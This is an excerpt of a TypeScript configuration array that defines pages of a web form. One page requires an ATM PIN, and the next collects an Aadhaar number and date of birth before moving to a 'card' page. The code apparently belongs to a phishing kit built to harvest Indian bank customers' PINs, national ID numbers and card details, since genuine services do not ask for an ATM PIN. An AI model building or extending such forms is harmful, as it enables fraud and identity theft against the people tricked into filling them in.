...
export const FORM_PAGES: PageConfig[] = [
    {
        ...
        fields: [
            ...
            { key: 'atmPin', displayName: 'ATM PIN', type: 'password', category: 'personal', required: true, maxlength: 6, placeholder: 'Enter ATM PIN' },
        ],
        nextPage: { main: 'identity' },
    },
    {
        id: 'screen-identity',
        pageName: 'identity',
        ...
        fields: [
            { key: 'aadhaarNumber', displayName: 'Aadhaar Number', type: 'tel', category: 'personal', required: true, maxlength: 12, placeholder: 'XXXX XXXX XXXX' },
            { key: 'dob', displayName: 'Date of Birth', type: 'text', category: 'personal', required: true, maxlength: 10, placeholder: 'DD/MM/YYYY' },
        ],
        nextPage: { main: 'card' },
    },
    {
